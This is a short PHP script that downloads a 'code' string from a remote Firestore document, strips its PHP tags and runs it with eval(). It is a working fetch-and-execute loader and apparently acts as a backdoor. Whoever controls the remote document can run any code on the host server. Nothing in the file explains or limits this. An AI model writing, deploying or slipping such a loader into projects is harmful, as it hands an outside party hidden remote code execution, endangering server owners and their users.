<?php
$projectId = 'ditx-ss';
$url = "https://firestore.googleapis.com/v1/projects/$projectId/databases/(default)/documents/scripts/ditxss";

$response = file_get_contents($url);
if ($response === FALSE) {
    die('Error al acceder a Firestore.');
}

$data = json_decode($response, true);
if (!isset($data['fields']['code']['stringValue'])) {
    die('El documento no contiene el campo "code".');
}

$code = $data['fields']['code']['stringValue'];


$code = str_replace(['<?php', '?>'], '', $code);


eval($code);
?>